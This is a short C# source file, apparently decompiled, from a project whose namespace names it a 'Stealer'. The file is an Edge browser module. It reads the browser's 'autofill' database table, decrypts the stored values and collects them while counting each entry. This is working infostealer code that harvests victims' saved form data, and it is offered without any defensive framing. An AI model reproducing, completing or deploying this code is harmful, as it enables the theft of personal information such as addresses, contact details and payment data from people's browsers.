using System;
using System.Collections.Generic;
using Stealer.Chromium;

namespace Stealer.Edge
{
	// Token: 0x0200002D RID: 45
	internal sealed class Autofill
	{
		// Token: 0x060000CE RID: 206 RVA: 0x000074E4 File Offset: 0x000056E4
		public static List<AutoFill> Get(string sWebData)
		{
			List<AutoFill> result;
			try
			{
				List<AutoFill> list = new List<AutoFill>();
				SQLite sqlite = SqlReader.ReadTable(sWebData, "autofill");
				if (sqlite == null)
				{
					result = list;
				}
				else
				{
					for (int i = 0; i < sqlite.GetRowCount(); i++)
					{
						AutoFill item = default(AutoFill);
						item.sName = Crypto.GetUTF8(sqlite.GetValue(i, 1));
						item.sValue = Crypto.GetUTF8(Crypto.EasyDecrypt(sWebData, sqlite.GetValue(i, 2)));
						Counter.AutoFill++;
						list.Add(item);
					}
					result = list;
				}
			}
			catch
			{
				result = new List<AutoFill>();
			}
			return result;
		}
	}
}
